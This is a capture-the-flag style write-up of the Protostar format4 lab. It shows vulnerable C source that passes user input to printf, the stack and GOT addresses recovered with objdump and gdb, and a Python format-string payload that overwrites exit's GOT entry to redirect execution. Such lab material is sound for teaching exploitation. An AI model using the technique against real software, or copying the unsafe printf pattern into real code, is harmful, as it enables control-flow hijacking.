### challenge
```txt
About
%p format4 looks at one method of redirecting execution in a process.

Hints

objdump -TR is your friend
This level is at /opt/protostar/bin/format4
```

### format4.c
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
```

### finding offsets
```txt
user@protostar:/opt/protostar/bin$ python -c 'print "A"*4 + ".%x"*40' > /tmp/format4.txt
user@protostar:/opt/protostar/bin$ ./format4 < /tmp/format4.txt 
AAAA.200.b7fd8420.bffff614.41414141.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.b7fe000a.b7ffeff4.0.0.bffff6b4.b7ff83d0
```

### finding addresses
```txt
user@protostar:/opt/protostar/bin$ objdump -d format4 | grep hello
080484b4 <hello>:

user@protostar:/opt/protostar/bin$ objdump -TR format4 | grep exit
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   exit
08049718 R_386_JUMP_SLOT   _exit
08049724 R_386_JUMP_SLOT   exit


Non-debugging symbols:
0x080483bc  _exit
0x080483bc  _exit@plt
0x080483ec  exit
0x080483ec  exit@plt

(gdb) disass 0x080483ec
Dump of assembler code for function exit@plt:
0x080483ec <exit@plt+0>:	jmp    *0x8049724


(gdb) print /x 0x080484b4 - 4
$1 = 0x80484b0

>>> 0x80484b0
134513840
```

### solution 1
```txt
user@protostar:/opt/protostar/bin$ python -c 'from struct import pack;print pack("<I", 0x8049724) + "%134513840c%4$n"' > /tmp/format4.bin
user@protostar:/opt/protostar/bin$ ./format4 < /tmp/format4.bin
code execution redirected! you win
```